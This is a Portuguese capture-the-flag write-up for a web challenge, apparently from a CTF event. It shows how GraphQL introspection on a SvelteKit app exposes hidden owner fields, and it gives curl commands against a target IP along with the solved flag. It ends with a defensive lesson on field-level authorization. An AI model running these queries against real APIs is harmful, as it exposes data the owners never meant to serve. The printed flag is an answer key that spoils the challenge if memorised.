# PoC — Secret Supernovas (Web, 50 pts) — #40

**Flag:** `CSSCTF{we_l000ve_grafs}`  ✅

## Enunciado
Alvo `http://34.116.80.78:9982/`. "This is just a list of stars. Nothing else to see here..."

## Passos
1. `/` → 303 → `/login`. App **SvelteKit** "Star City Observatory". Credenciais na própria página: `cadet/star`.
   ```bash
   curl -s -i -c c.txt -X POST http://34.116.80.78:9982/login \
     -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=cadet&password=star'
   ```
2. A lista de estrelas é carregada por JS que chama **GraphQL** em `/graphql` (visto no bundle `_app/immutable/nodes/*.js`):
   ```
   query Stars { stars { id name spectralClass magnitude classification galaxy { name } } }
   ```
3. **Introspection habilitada** → schema expõe campos ocultos: `Star.owner` e `Person.description`.
   ```bash
   curl -s -b c.txt http://34.116.80.78:9982/graphql -H 'content-type: application/json' \
     --data '{"query":"query{ stars{ name owner{ first_name description } } }"}'
   ```
4. A flag está na `description` do owner da estrela "Black Canary" (Laurel).

## Lição
GraphQL introspection em produção + Excessive Data Exposure: campos não exibidos na UI continuam acessíveis pela API. "Não mostrar" ≠ controle de acesso. Desabilitar introspection e aplicar autorização por campo.
